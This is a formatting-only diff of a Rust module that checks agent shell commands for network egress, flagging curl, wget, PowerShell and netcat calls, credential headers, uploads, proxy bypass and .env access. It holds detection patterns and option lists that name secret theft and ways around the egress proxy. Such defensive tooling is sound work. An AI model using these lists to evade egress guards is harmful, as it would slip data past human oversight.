@@ -10,44 +10,30 @@
 //! - `egress-tamper`: commands that would switch the run-time layer off.
 //! - `env-file`: `.env` files inside the project may be read and written (except the test credentials), outside they are blocked.
 
-use crate::egress::{
-    destinations, ps_param, CURL_PROXY_OPTIONS, CURL_REDIRECT_OPTIONS, CURL_VALUE_LONG,
-    CURL_VALUE_SHORT, EGRESS_TOOL_RE, WGET_VALUE_OPTIONS,
-};
+use crate::egress::{destinations, ps_param, CURL_PROXY_OPTIONS, CURL_REDIRECT_OPTIONS, CURL_VALUE_LONG, CURL_VALUE_SHORT, EGRESS_TOOL_RE, WGET_VALUE_OPTIONS};
 use crate::paths::{inside_any, normalize_path, G};
 use crate::pyre::{last_segment, partition, rpartition, Re};
 use crate::shell::{command_starts, executable_name, quoted_ranges, shell_event_variants, Event};
 use base64::Engine;
-use egress_policy::{
-    host_matches, judge, parse_request_url, path_matches, Effective, ORIGIN_LOCAL, TCP,
-    UNKNOWN_METHOD,
-};
+use egress_policy::{host_matches, judge, parse_request_url, path_matches, Effective, ORIGIN_LOCAL, TCP, UNKNOWN_METHOD};
 use serde_json::Value;
 use std::collections::HashSet;
 use std::path::PathBuf;
 use std::sync::LazyLock;
 
 pub const RULES: [&str; 4] = ["egress-host", "egress-content", "egress-tamper", "env-file"];
-const BLOCK_HINT: &str =
-    "(.specs/project/NETWORK.json; ask the user to add it in the Test environment tab)";
+const BLOCK_HINT: &str = "(.specs/project/NETWORK.json; ask the user to add it in the Test environment tab)";
 const MAX_FILE_BYTES: u64 = 1024 * 1024;
 const MAX_DEPTH: usize = 3;
 const SENTINEL: &str = "\u{0}VAR\u{0}";
 
-static SECRET_NAME: LazyLock<Re> =
-    LazyLock::new(|| Re::ci(r"(token|secret|passw|credential|private_key|api_?key|auth|pwd)"));
+static SECRET_NAME: LazyLock<Re> = LazyLock::new(|| Re::ci(r"(token|secret|passw|credential|private_key|api_?key|auth|pwd)"));
 static EXPANDABLE_NAME: LazyLock<Re> = LazyLock::new(|| Re::ci(r"_(?:URL|HOST|BASE)\z"));
-static TEMP_HINT: LazyLock<Re> =
-    LazyLock::new(|| Re::ci(r"[\\/](tmp|temp|scratchpad)[\\/]|^/tmp/"));
-static VARIABLE_RE: LazyLock<Re> =
-    LazyLock::new(|| Re::ci(r"\$\{(\w+)\}|\$env:(\w+)|\$([A-Za-z_]\w*)|%([A-Za-z_]\w*)%"));
-static URL_LITERAL_RE: LazyLock<Re> =
-    LazyLock::new(|| Re::ci(r#"(?:https?|wss?)://[^\s'"`\\<>)|^]+"#));
-static SCRIPT_EXT_RE: LazyLock<Re> =
-    LazyLock::new(|| Re::ci(r"\.(?:py|pyw|js|mjs|cjs|ts|mts|cts|tsx|jsx|ps1|psm1|sh|bash|zsh)\z"));
-static VENDORED_RE: LazyLock<Re> = LazyLock::new(|| {
-    Re::ci(r"(?:^|/)(?:node_modules|site-packages|\.venv|venv|\.git|__pycache__)(?:/|\z)")
-});
+static TEMP_HINT: LazyLock<Re> = LazyLock::new(|| Re::ci(r"[\\/](tmp|temp|scratchpad)[\\/]|^/tmp/"));
+static VARIABLE_RE: LazyLock<Re> = LazyLock::new(|| Re::ci(r"\$\{(\w+)\}|\$env:(\w+)|\$([A-Za-z_]\w*)|%([A-Za-z_]\w*)%"));
+static URL_LITERAL_RE: LazyLock<Re> = LazyLock::new(|| Re::ci(r#"(?:https?|wss?)://[^\s'"`\\<>)|^]+"#));
+static SCRIPT_EXT_RE: LazyLock<Re> = LazyLock::new(|| Re::ci(r"\.(?:py|pyw|js|mjs|cjs|ts|mts|cts|tsx|jsx|ps1|psm1|sh|bash|zsh)\z"));
+static VENDORED_RE: LazyLock<Re> = LazyLock::new(|| Re::ci(r"(?:^|/)(?:node_modules|site-packages|\.venv|venv|\.git|__pycache__)(?:/|\z)"));
 static SKIP_CONTENT_RE: LazyLock<Re> = LazyLock::new(|| {
     Re::ci(
         r"\.(?:md|mdx|markdown|rst|txt|adoc|log|csv|tsv|lock|png|jpe?g|gif|webp|ico|bmp|pdf|woff2?|ttf|otf|eot|zip|gz|tgz|7z|rar|jar|dll|exe|so|dylib|mp[34]|mov|wasm|map)\z|(?:^|/)(?:package-lock\.json|npm-shrinkwrap\.json|packages\.lock\.json|pnpm-lock\.yaml|yarn\.lock|poetry\.lock|composer\.lock|Pipfile\.lock)\z",
@@ -55,19 +41,12 @@ static SKIP_CONTENT_RE: LazyLock<Re> = LazyLock::new(|| {
 });
 static SCHEME_PREFIX: LazyLock<Re> = LazyLock::new(|| Re::new(r"^[A-Za-z][A-Za-z0-9+.\-]*://"));
 static SUBSHELL_RE: LazyLock<Re> = LazyLock::new(|| Re::new(r"\$\(|`|<\("));
-static PS_NOT_INLINE: LazyLock<Re> = LazyLock::new(|| {
-    Re::ci(r"^\$\w+\z|^\(|\$\(|Get-Content|\b(?:gc|cat|type)\b|ReadAll|\bIO\.File")
-});
-static CRED_HEADER: LazyLock<Re> = LazyLock::new(|| {
-    Re::ci(
-        r#"(?:^|[\s{;,'"])(?:authorization|proxy-authorization|cookie|x-api-key|x-[\w-]*token)\s*[:=]"#,
-    )
-});
+static PS_NOT_INLINE: LazyLock<Re> = LazyLock::new(|| Re::ci(r"^\$\w+\z|^\(|\$\(|Get-Content|\b(?:gc|cat|type)\b|ReadAll|\bIO\.File"));
+static CRED_HEADER: LazyLock<Re> = LazyLock::new(|| Re::ci(r#"(?:^|[\s{;,'"])(?:authorization|proxy-authorization|cookie|x-api-key|x-[\w-]*token)\s*[:=]"#));
 static ASSIGNMENT: LazyLock<Re> = LazyLock::new(|| Re::new(r"^[A-Za-z_]\w*\+?="));
 static AUTH_SPLIT: LazyLock<Re> = LazyLock::new(|| Re::new(r"[/?#]"));
 static URL_WORD: LazyLock<Re> = LazyLock::new(|| Re::new(r"^[A-Za-z][A-Za-z0-9+.\-]*://\S+\z"));
-static DNS_TYPE: LazyLock<Re> =
-    LazyLock::new(|| Re::ci(r"^(?:A|AAAA|MX|TXT|NS|SOA|CNAME|ANY|PTR|SRV|AXFR)\z"));
+static DNS_TYPE: LazyLock<Re> = LazyLock::new(|| Re::ci(r"^(?:A|AAAA|MX|TXT|NS|SOA|CNAME|ANY|PTR|SRV|AXFR)\z"));
 static DRIVE_PATH: LazyLock<Re> = LazyLock::new(|| Re::new(r"^[A-Za-z]:[\\/]"));
 static NC_LISTEN: LazyLock<Re> = LazyLock::new(|| Re::new(r"^-[A-Za-z]*l"));
 static LETTER_OPT: LazyLock<Re> = LazyLock::new(|| Re::new(r"^-[A-Za-z]"));
@@ -140,11 +119,7 @@ impl<'g> Ctx<'g> {
     pub fn effective(&mut self) -> &Effective {
         if self.effective.is_none() {
             let names = self.env_names();
-            self.effective = Some(egress_policy::load_effective(
-                std::path::Path::new(&self.root),
-                &self.data_dir,
-                &names,
-            ));
+            self.effective = Some(egress_policy::load_effective(std::path::Path::new(&self.root), &self.data_dir, &names));
         }
         self.effective.as_ref().expect("set above")
     }
@@ -166,24 +141,13 @@ impl<'g> Ctx<'g> {
     }
 
     /// Judges one request; records a hit (blocked) or a log line (allowed). Returns true when allowed.
-    pub fn request(
-        &mut self,
-        method: &str,
-        url: &str,
-        cred: bool,
-        rule: &str,
-        place_note: &str,
-    ) -> bool {
+    pub fn request(&mut self, method: &str, url: &str, cred: bool, rule: &str, place_note: &str) -> bool {
         let names = self.env_names();
         let (allowed, kind, reason) = {
             let eff = self.effective().clone();
             judge(&eff, method, url, cred, Some(&names))
         };
-        let shown = if method == UNKNOWN_METHOD {
-            "ANY"
-        } else {
-            method
-        };
+        let shown = if method == UNKNOWN_METHOD { "ANY" } else { method };
         let place = match parse_request_url(url) {
             Ok((_, host, _, path)) => format!("{host}{path}"),
             Err(_) => url.chars().take(80).collect(),
@@ -200,30 +164,20 @@ impl<'g> Ctx<'g> {
         } else {
             format!("{shown} {place}: {reason} {BLOCK_HINT}")
         };
-        let prefix = if place_note.is_empty() {
-            String::new()
-        } else {
-            format!("{place_note}: ")
-        };
+        let prefix = if place_note.is_empty() { String::new() } else { format!("{place_note}: ") };
         self.hit(rule, &format!("{prefix}{text}"));
         false
     }
 
     pub fn unprovable(&mut self, what: &str, why: &str) {
-        self.hit(
-            "egress-host",
-            &format!("{what}: {why}; use a literal URL or a *_URL / *_HOST / *_BASE name defined in .specs/project/.env.test {BLOCK_HINT}"),
-        );
+        self.hit("egress-host", &format!("{what}: {why}; use a literal URL or a *_URL / *_HOST / *_BASE name defined in .specs/project/.env.test {BLOCK_HINT}"));
     }
 }
 
 /// `{NAME: value}` of `<project>/.specs/project/.env.test` (non-empty values); values stay inside the guard.
 pub fn read_env_values(project_root: &str) -> Vec<(String, String)> {
     let mut values: Vec<(String, String)> = Vec::new();
-    let path = std::path::Path::new(project_root)
-        .join(".specs")
-        .join("project")
-        .join(".env.test");
+    let path = std::path::Path::new(project_root).join(".specs").join("project").join(".env.test");
     let Ok(bytes) = std::fs::read(path) else {
         return values;
     };
@@ -265,11 +219,7 @@ fn substitute(ctx: &mut Ctx, text: &str) -> String {
             .iter()
             .find(|(k, _)| *k == name)
             .map(|(_, v)| v.clone())
-            .or_else(|| {
-                env.iter()
-                    .find(|(k, _)| k.to_lowercase() == name.to_lowercase())
-                    .map(|(_, v)| v.clone())
-            });
+            .or_else(|| env.iter().find(|(k, _)| k.to_lowercase() == name.to_lowercase()).map(|(_, v)| v.clone()));
         match value {
             Some(v) if EXPANDABLE_NAME.is_match(&name) => v,
             _ => SENTINEL.to_string(),
@@ -279,20 +229,14 @@ fn substitute(ctx: &mut Ctx, text: &str) -> String {
 
 /// `(url, cred, why)`: the URL a command word names with the allowed variables expanded, or why it cannot be proven.
 fn resolve_target(ctx: &mut Ctx, raw: &str) -> (Option<String>, bool, String) {
-    let mut text = raw
-        .trim()
-        .trim_matches(|c| c == '"' || c == '\'')
-        .to_string();
+    let mut text = raw.trim().trim_matches(|c| c == '"' || c == '\'').to_string();
     if text.contains("$(") || text.contains('`') {
         return (None, false, "the target comes from a sub-shell".into());
     }
     text = substitute(ctx, &text);
     let mut cred = false;
     if text.contains(SENTINEL) {
-        let scheme = SCHEME_PREFIX
-            .match_start(&text)
-            .map(|m| m.text().to_string())
-            .unwrap_or_default();
+        let scheme = SCHEME_PREFIX.match_start(&text).map(|m| m.text().to_string()).unwrap_or_default();
         let rest = text[scheme.len()..].to_string();
         if scheme.contains(SENTINEL) || text.starts_with(SENTINEL) {
             return (None, false, "the scheme or host is a variable that is not a *_URL/*_HOST/*_BASE name of .env.test".into());
@@ -317,23 +261,11 @@ fn resolve_target(ctx: &mut Ctx, raw: &str) -> (Option<String>, bool, String) {
                 hostport.split(':').next().unwrap_or("").to_string()
             };
             if host.contains(SENTINEL) {
-                return (
-                    None,
-                    false,
-                    "the host is a variable that is not a *_URL/*_HOST/*_BASE name of .env.test"
-                        .into(),
-                );
+                return (None, false, "the host is a variable that is not a *_URL/*_HOST/*_BASE name of .env.test".into());
             }
             authority = format!("{}{}{}", userinfo, if at { "@" } else { "" }, host);
         }
-        let mut path = tail
-            .split('?')
-            .next()
-            .unwrap_or("")
-            .split('#')
-            .next()
-            .unwrap_or("")
-            .to_string();
+        let mut path = tail.split('?').next().unwrap_or("").split('#').next().unwrap_or("").to_string();
         if let Some(i) = path.find(SENTINEL) {
             path.truncate(i);
             path = match path.rfind('/') {
@@ -344,21 +276,14 @@ fn resolve_target(ctx: &mut Ctx, raw: &str) -> (Option<String>, bool, String) {
         text = format!("{scheme}{authority}{path}");
     }
     let scheme_match = SCHEME_PREFIX.match_start(&text);
-    if scheme_match
-        .as_ref()
-        .is_some_and(|m| m.text().to_lowercase() == "file://")
-    {
+    if scheme_match.as_ref().is_some_and(|m| m.text().to_lowercase() == "file://") {
         return (Some(String::new()), false, String::new());
     }
     let after = match &scheme_match {
         Some(m) => text[m.text().len()..].to_string(),
         None => text.clone(),
     };
-    let authority = AUTH_SPLIT
-        .split(&after)
-        .into_iter()
-        .next()
-        .unwrap_or_default();
+    let authority = AUTH_SPLIT.split(&after).into_iter().next().unwrap_or_default();
     if authority.contains('@') {
         cred = true;
     }
@@ -367,42 +292,11 @@ fn resolve_target(ctx: &mut Ctx, raw: &str) -> (Option<String>, bool, String) {
 
 // ---- facts of the HTTP tools ------------------------------------------------------------------------------------------------------
 
-const CURL_UPLOAD: &[&str] = &[
-    "-d",
-    "--data",
-    "--data-ascii",
-    "--data-binary",
-    "--data-raw",
-    "--data-urlencode",
-    "-F",
-    "--form",
-    "--form-string",
-    "-T",
-    "--upload-file",
-    "--json",
-];
-const CURL_CRED: &[&str] = &[
-    "-u",
-    "--user",
-    "--oauth2-bearer",
-    "-n",
-    "--netrc",
-    "--netrc-file",
-    "--netrc-optional",
-    "-b",
-    "--cookie",
-];
+const CURL_UPLOAD: &[&str] =
+    &["-d", "--data", "--data-ascii", "--data-binary", "--data-raw", "--data-urlencode", "-F", "--form", "--form-string", "-T", "--upload-file", "--json"];
+const CURL_CRED: &[&str] = &["-u", "--user", "--oauth2-bearer", "-n", "--netrc", "--netrc-file", "--netrc-optional", "-b", "--cookie"];
 const WGET_UPLOAD: &[&str] = &["--post-data", "--post-file", "--body-data", "--body-file"];
-const WGET_CRED: &[&str] = &[
-    "--user",
-    "--password",
-    "--http-user",
-    "--http-password",
-    "--ftp-user",
-    "--ftp-password",
-    "--load-cookies",
-    "--proxy-user",
-];
+const WGET_CRED: &[&str] = &["--user", "--password", "--http-user", "--http-password", "--ftp-user", "--ftp-password", "--load-cookies", "--proxy-user"];
 
 #[derive(Default, Clone, Debug)]
 struct Facts {
@@ -460,32 +354,17 @@ fn curl_apply(facts: &mut Facts, option: &str, value: &str) {
         facts.head = true;
     } else if option == "-G" || option == "--get" {
         facts.get = true;
-    } else if CURL_UPLOAD.contains(&option)
-        || option.starts_with("--data")
-        || option.starts_with("--form")
-    {
+    } else if CURL_UPLOAD.contains(&option) || option.starts_with("--data") || option.starts_with("--form") {
         facts.upload = true;
         facts.file_upload = facts.file_upload || curl_body_is_file(option, value);
     } else if option == "-H" || option == "--header" {
         facts.cred = facts.cred || CRED_HEADER.is_match(value);
     } else if CURL_CRED.contains(&option) {
         facts.cred = true;
-    } else if [
-        "-x",
-        "--proxy",
-        "--preproxy",
-        "--socks4",
-        "--socks4a",
-        "--socks5",
-        "--socks5-hostname",
-    ]
-    .contains(&option)
-    {
+    } else if ["-x", "--proxy", "--preproxy", "--socks4", "--socks4a", "--socks5", "--socks5-hostname"].contains(&option) {
         facts.tamper.push(format!("curl {option} sends the request through another proxy and skips the loop's egress layer"));
     } else if option == "--noproxy" {
-        facts
-            .tamper
-            .push("curl --noproxy skips the loop's egress proxy".into());
+        facts.tamper.push("curl --noproxy skips the loop's egress proxy".into());
     } else if ["-h", "--help", "-V", "--version", "--manual"].contains(&option) {
         facts.help = true;
     }
@@ -542,12 +421,7 @@ fn wget_facts(args: &[String]) -> Facts {
             (word.clone(), false, String::new())
         };
         let mut value = v;
-        if !equals
-            && (WGET_VALUE_OPTIONS.contains(&option.as_str())
-                || option == "-e"
-                || option == "--execute")
-            && index < args.len()
-        {
+        if !equals && (WGET_VALUE_OPTIONS.contains(&option.as_str()) || option == "-e" || option == "--execute") && index < args.len() {
             value = args[index].clone();
             index += 1;
         }
@@ -556,10 +430,7 @@ fn wget_facts(args: &[String]) -> Facts {
             facts.method = if up.is_empty() { None } else { Some(up) };
         } else if WGET_UPLOAD.contains(&option.as_str()) {
             facts.upload = true;
-            facts.file_upload = facts.file_upload
-                || option == "--post-file"
-                || option == "--body-file"
-                || SUBSHELL_RE.is_match(&value);
+            facts.file_upload = facts.file_upload || option == "--post-file" || option == "--body-file" || SUBSHELL_RE.is_match(&value);
         } else if option == "--spider" {
             facts.head = true;
         } else if option == "--header" {
@@ -567,13 +438,9 @@ fn wget_facts(args: &[String]) -> Facts {
         } else if WGET_CRED.contains(&option.as_str()) {
             facts.cred = true;
         } else if option == "--no-proxy" {
-            facts
-                .tamper
-                .push("wget --no-proxy skips the loop's egress proxy".into());
+            facts.tamper.push("wget --no-proxy skips the loop's egress proxy".into());
         } else if (option == "-e" || option == "--execute") && Re::ci("proxy").is_match(&value) {
-            facts
-                .tamper
-                .push("wget -e proxy setting overrides the loop's egress proxy".into());
+            facts.tamper.push("wget -e proxy setting overrides the loop's egress proxy".into());
         } else if ["-h", "--help", "-V", "--version"].contains(&option.as_str()) {
             facts.help = true;
         }
@@ -608,9 +475,7 @@ fn powershell_facts(args: &[String]) -> Facts {
             }
             Some("Body") | Some("InFile") | Some("Form") => {
                 facts.upload = true;
-                facts.file_upload = facts.file_upload
-                    || parameter != Some("Body")
-                    || PS_NOT_INLINE.is_match(&value);
+                facts.file_upload = facts.file_upload || parameter != Some("Body") || PS_NOT_INLINE.is_match(&value);
             }
             Some("Headers") => {
                 let mut parts = vec![value.clone()];
@@ -620,14 +485,8 @@ fn powershell_facts(args: &[String]) -> Facts {
                 }
                 facts.cred = facts.cred || CRED_HEADER.is_match(&parts.join(" "));
             }
-            Some("Credential")
-            | Some("Authentication")
-            | Some("Token")
-            | Some("UseDefaultCredentials")
-            | Some("WebSession") => facts.cred = true,
-            Some("NoProxy") => facts
-                .tamper
-                .push("-NoProxy skips the loop's egress proxy".into()),
+            Some("Credential") | Some("Authentication") | Some("Token") | Some("UseDefaultCredentials") | Some("WebSession") => facts.cred = true,
+            Some("NoProxy") => facts.tamper.push("-NoProxy skips the loop's egress proxy".into()),
             _ => {}
         }
     }
@@ -688,16 +547,8 @@ fn ps_value(args: &[String], names: &[&str]) -> Option<String> {
         }
         let stripped = word.trim_start_matches('-');
         let (name, colon, value) = partition(stripped, ":");
-        if !name.is_empty()
-            && names
-                .iter()
-                .any(|item| item.to_lowercase().starts_with(&name.to_lowercase()))
-        {
-            return if colon {
-                Some(value.to_string())
-            } else {
-                args.get(index + 1).cloned()
-            };
+        if !name.is_empty() && names.iter().any(|item| item.to_lowercase().starts_with(&name.to_lowercase())) {
+            return if colon { Some(value.to_string()) } else { args.get(index + 1).cloned() };
         }
     }
     None
@@ -708,33 +559,15 @@ fn split_host_port(text: &str, default_port: &str) -> (String, String) {
     if SCHEME_PREFIX.match_start(&text).is_some() {
         text = text[text.find("://").map(|i| i + 3).unwrap_or(0)..].to_string();
     }
-    let first = AUTH_SPLIT
-        .split(&text)
-        .into_iter()
-        .next()
-        .unwrap_or_default();
+    let first = AUTH_SPLIT.split(&text).into_iter().next().unwrap_or_default();
     let text = rpartition(&first, "@").2.to_string();
     if text.starts_with('[') {
         let (host, _, rest) = partition(&text, "]");
         let port = rest.strip_prefix(':').unwrap_or("");
-        return (
-            format!("{host}]"),
-            if port.is_empty() {
-                default_port.to_string()
-            } else {
-                port.to_string()
-            },
-        );
+        return (format!("{host}]"), if port.is_empty() { default_port.to_string() } else { port.to_string() });
     }
     let (host, colon, port) = partition(&text, ":");
-    (
-        host.to_string(),
-        if colon && !port.is_empty() && port.chars().all(|c| c.is_ascii_digit()) {
-            port.to_string()
-        } else {
-            default_port.to_string()
-        },
-    )
+    (host.to_string(), if colon && !port.is_empty() && port.chars().all(|c| c.is_ascii_digit()) { port.to_string() } else { default_port.to_string() })
 }
 
 /// `[(host, port)]` a socket/remote/DNS tool talks to; the port is text ('0' = not stated); empty when it names none.
@@ -745,15 +578,9 @@ fn net_socket_targets(name: &str, args: &[String]) -> Vec<(String, String)> {
             .filter(|v| !v.is_empty())
             .or_else(|| args.iter().find(|w| !w.starts_with('-')).cloned())
             .unwrap_or_default();
-        let port = ps_value(args, &["Port"])
-            .filter(|v| !v.is_empty())
-            .unwrap_or_else(|| default.to_string());
+        let port = ps_value(args, &["Port"]).filter(|v| !v.is_empty()).unwrap_or_else(|| default.to_string());
         let host = host.trim_matches(|c| c == '"' || c == '\'').to_string();
-        return if host.is_empty() {
-            vec![]
-        } else {
-            vec![(host, port)]
-        };
+        return if host.is_empty() { vec![] } else { vec![(host, port)] };
     }
     let values = net_value_options(name);
     let ports = net_port_option(name);
@@ -777,11 +604,7 @@ fn net_socket_targets(name: &str, args: &[String]) -> Vec<(String, String)> {
             for (position, letter) in letters.iter().enumerate() {
                 if values.contains(*letter) {
                     let tail: String = letters[position + 1..].iter().collect();
-                    let value = if !tail.is_empty() {
-                        tail.clone()
-                    } else {
-                        args.get(index).cloned().unwrap_or_default()
-                    };
+                    let value = if !tail.is_empty() { tail.clone() } else { args.get(index).cloned().unwrap_or_default() };
                     if tail.is_empty() {
                         index += 1;
                     }
@@ -799,45 +622,17 @@ fn net_socket_targets(name: &str, args: &[String]) -> Vec<(String, String)> {
         return vec![];
     }
     if name == "dig" {
-        let servers: Vec<String> = positional
-            .iter()
-            .filter(|i| i.starts_with('@'))
-            .map(|i| i[1..].to_string())
-            .collect();
-        let names: Vec<String> = positional
-            .iter()
-            .filter(|i| !i.starts_with('@') && !DNS_TYPE.is_match(i))
-            .cloned()
-            .collect();
-        let port = if port_option.is_empty() {
-            "53".to_string()
-        } else {
-            port_option.clone()
-        };
-        return names
-            .iter()
-            .take(1)
-            .chain(servers.iter())
-            .map(|i| (i.clone(), port.clone()))
-            .collect();
+        let servers: Vec<String> = positional.iter().filter(|i| i.starts_with('@')).map(|i| i[1..].to_string()).collect();
+        let names: Vec<String> = positional.iter().filter(|i| !i.starts_with('@') && !DNS_TYPE.is_match(i)).cloned().collect();
+        let port = if port_option.is_empty() { "53".to_string() } else { port_option.clone() };
+        return names.iter().take(1).chain(servers.iter()).map(|i| (i.clone(), port.clone())).collect();
     }
     if name == "nslookup" || name == "host" {
-        return positional
-            .iter()
-            .take(2)
-            .map(|i| (i.clone(), "53".to_string()))
-            .collect();
+        return positional.iter().take(2).map(|i| (i.clone(), "53".to_string())).collect();
     }
-    let mut port = if port_option.is_empty() {
-        default.to_string()
-    } else {
-        port_option.clone()
-    };
+    let mut port = if port_option.is_empty() { default.to_string() } else { port_option.clone() };
     if ["nc", "ncat", "netcat", "telnet"].contains(&name) {
-        if positional.len() > 1
-            && !positional[1].is_empty()
-            && positional[1].chars().all(|c| c.is_ascii_digit())
-        {
+        if positional.len() > 1 && !positional[1].is_empty() && positional[1].chars().all(|c| c.is_ascii_digit()) {
             port = positional[1].clone();
         } else if name != "telnet" && port_option.is_empty() {
             port = "0".into();
@@ -847,30 +642,17 @@ fn net_socket_targets(name: &str, args: &[String]) -> Vec<(String, String)> {
     if name == "scp" {
         let mut hosts = Vec::new();
         for item in &positional {
-            if DRIVE_PATH.is_match(item)
-                || item.starts_with('.')
-                || item.starts_with('/')
-                || item.starts_with('~')
-                || !item.contains(':')
-            {
+            if DRIVE_PATH.is_match(item) || item.starts_with('.') || item.starts_with('/') || item.starts_with('~') || !item.contains(':') {
                 continue;
             }
-            let source = if !item.contains("://") {
-                partition(item, ":").0.to_string()
-            } else {
-                item.clone()
-            };
+            let source = if !item.contains("://") { partition(item, ":").0.to_string() } else { item.clone() };
             hosts.push(split_host_port(&source, &port));
         }
         return hosts;
     }
     if name == "sftp" {
         let first = &positional[0];
-        let source = if !first.contains("://") {
-            partition(first, ":").0.to_string()
-        } else {
-            first.clone()
-        };
+        let source = if !first.contains("://") { partition(first, ":").0.to_string() } else { first.clone() };
         return vec![split_host_port(&source, &port)];
     }
     vec![split_host_port(&positional[0], &port)]
@@ -909,11 +691,7 @@ fn expand_word(ctx: &mut Ctx, word: &str) -> String {
             .iter()
             .find(|(k, _)| *k == name)
             .map(|(_, v)| v.clone())
-            .or_else(|| {
-                env.iter()
-                    .find(|(k, _)| k.to_lowercase() == name.to_lowercase())
-                    .map(|(_, v)| v.clone())
-            });
+            .or_else(|| env.iter().find(|(k, _)| k.to_lowercase() == name.to_lowercase()).map(|(_, v)| v.clone()));
         let replaced = match value {
             Some(v) if EXPANDABLE_NAME.is_match(&name) => v,
             _ => SENTINEL.to_string(),
@@ -924,11 +702,7 @@ fn expand_word(ctx: &mut Ctx, word: &str) -> String {
 
 fn net_tool(ctx: &mut Ctx, name: &str, args: &[String], raw: &str) {
     if is_net_url_tool(name) {
-        let mut urls: Vec<String> = args
-            .iter()
-            .map(|w| w.trim_matches(|c| c == '"' || c == '\'').to_string())
-            .filter(|w| URL_WORD.is_match(w))
-            .collect();
+        let mut urls: Vec<String> = args.iter().map(|w| w.trim_matches(|c| c == '"' || c == '\'').to_string()).filter(|w| URL_WORD.is_match(w)).collect();
         if name == "start-bitstransfer" {
             if let Some(v) = ps_value(args, &["Source"]) {
                 let v = v.trim_matches(|c| c == '"' || c == '\'').to_string();
@@ -958,11 +732,7 @@ fn net_tool(ctx: &mut Ctx, name: &str, args: &[String], raw: &str) {
         if host.is_empty() {
             continue;
         }
-        let spec = if port != "0" {
-            format!("tcp://{host}:{port}")
-        } else {
-            format!("tcp://{host}")
-        };
+        let spec = if port != "0" { format!("tcp://{host}:{port}") } else { format!("tcp://{host}") };
         let (url, cred, why) = resolve_target(ctx, &spec);
         if !why.is_empty() {
             let shown: String = host.chars().take(60).collect();
@@ -993,10 +763,7 @@ fn http_tool(ctx: &mut Ctx, name: &str, args: &[String], cred_forced: bool) {
     }
     if targets.is_empty() {
         if !facts.help && !redirected {
-            ctx.unprovable(
-                name,
-                "no target URL found (a sub-shell, a config file or an input list hides it)",
-            );
+            ctx.unprovable(name, "no target URL found (a sub-shell, a config file or an input list hides it)");
         }
         return;
     }
@@ -1007,33 +774,16 @@ fn http_tool(ctx: &mut Ctx, name: &str, args: &[String], cred_forced: bool) {
             let shown: String = target.chars().take(60).collect();
             ctx.unprovable(&format!("{name} {shown}"), &why);
         } else if let Some(url) = url.filter(|u| !u.is_empty()) {
-            let allowed = ctx.request(
-                &method,
-                &url,
-                cred || facts.cred || cred_forced,
-                "egress-host",
-                "",
-            );
+            let allowed = ctx.request(&method, &url, cred || facts.cred || cred_forced, "egress-host", "");
             let names = ctx.env_names();
             let listed = allowed && entry_lists_method(ctx.effective(), &method, &url, &names);
-            ctx.http_calls.push(HttpCall {
-                name: name.to_string(),
-                method: method.clone(),
-                allowed,
-                file: facts.file_upload,
-                listed,
-            });
+            ctx.http_calls.push(HttpCall { name: name.to_string(), method: method.clone(), allowed, file: facts.file_upload, listed });
         }
     }
 }
 
 /// True when an ACTIVE, non-local allow entry that matches host, port and path names this exact HTTP method.
-fn entry_lists_method(
-    effective: &Effective,
-    method: &str,
-    url: &str,
-    env_names: &[String],
-) -> bool {
+fn entry_lists_method(effective: &Effective, method: &str, url: &str, env_names: &[String]) -> bool {
     let method = if method == UNKNOWN_METHOD {
         UNKNOWN_METHOD.to_string()
     } else if method.eq_ignore_ascii_case(TCP) {
@@ -1048,16 +798,10 @@ fn entry_lists_method(
         return false;
     };
     for entry in &effective.allow {
-        if entry.origin == ORIGIN_LOCAL
-            || (!entry.if_missing.is_empty() && env_names.contains(&entry.if_missing))
-        {
+        if entry.origin == ORIGIN_LOCAL || (!entry.if_missing.is_empty() && env_names.contains(&entry.if_missing)) {
             continue;
         }
-        if host_matches(&entry.host, &host)
-            && entry.port.is_none_or(|p| Some(p) == port)
-            && path_matches(&entry.path, &path)
-            && entry.methods.contains(&method)
-        {
+        if host_matches(&entry.host, &host) && entry.port.is_none_or(|p| Some(p) == port) && path_matches(&entry.path, &path) && entry.methods.contains(&method) {
             return true;
         }
     }
@@ -1084,10 +828,7 @@ pub fn inline_upload_allowed(ctx: &Ctx, statement: &str) -> bool {
     if !probe.hits.is_empty() || probe.http_calls.is_empty() || probe.http_calls.len() < tools {
         return false;
     }
-    probe
-        .http_calls
-        .iter()
-        .all(|c| c.allowed && c.listed && !c.file)
+    probe.http_calls.iter().all(|c| c.allowed && c.listed && !c.file)
 }
 
 // ---- URL literals in code --------------------------------------------------------------------------------------------------------
@@ -1095,10 +836,7 @@ pub fn inline_upload_allowed(ctx: &Ctx, statement: &str) -> bool {
 fn url_literals(text: &str) -> Vec<String> {
     let mut found: Vec<String> = Vec::new();
     for m in URL_LITERAL_RE.find_all(text) {
-        let url = m
-            .text()
-            .trim_end_matches(['.', ',', ';', ':', '!', '?'])
-            .to_string();
+        let url = m.text().trim_end_matches(['.', ',', ';', ':', '!', '?']).to_string();
         if !found.contains(&url) {
             found.push(url);
         }
@@ -1129,45 +867,25 @@ fn exempt_literal(url: &str) -> bool {
     }
 }
 
-fn literal_hits(
-    ctx: &mut Ctx,
-    text: &str,
-    rule: &str,
-    cred_forced: bool,
-    place: &str,
-    exempt: bool,
-) {
+fn literal_hits(ctx: &mut Ctx, text: &str, rule: &str, cred_forced: bool, place: &str, exempt: bool) {
     static TEMPLATE: LazyLock<Re> = LazyLock::new(|| Re::new(r"[${}<>%*]"));
     for url in url_literals(text) {
         let after = url.split_once("://").map(|(_, r)| r).unwrap_or("");
-        let authority = AUTH_SPLIT
-            .split(after)
-            .into_iter()
-            .next()
-            .unwrap_or_default();
+        let authority = AUTH_SPLIT.split(after).into_iter().next().unwrap_or_default();
         if TEMPLATE.is_match(rpartition(&authority, "@").2) {
             continue;
         }
         if exempt && exempt_literal(&url) {
             continue;
         }
-        ctx.request(
-            UNKNOWN_METHOD,
-            &url,
-            cred_forced || authority.contains('@'),
-            rule,
-            place,
-        );
+        ctx.request(UNKNOWN_METHOD, &url, cred_forced || authority.contains('@'), rule, place);
     }
 }
 
 fn read_script(ctx: &mut Ctx, path: &str) -> Option<String> {
     let expanded = ctx.expand(path);
     let absolute = ctx.normalize(&expanded, Some(&ctx.cwd.clone()));
-    if ctx.scanned.contains(&absolute)
-        || !std::path::Path::new(&absolute).is_file()
-        || VENDORED_RE.is_match(&absolute)
-    {
+    if ctx.scanned.contains(&absolute) || !std::path::Path::new(&absolute).is_file() || VENDORED_RE.is_match(&absolute) {
         return None;
     }
     if !(ctx.inside(&absolute) || ctx.temp_folder(&absolute)) {
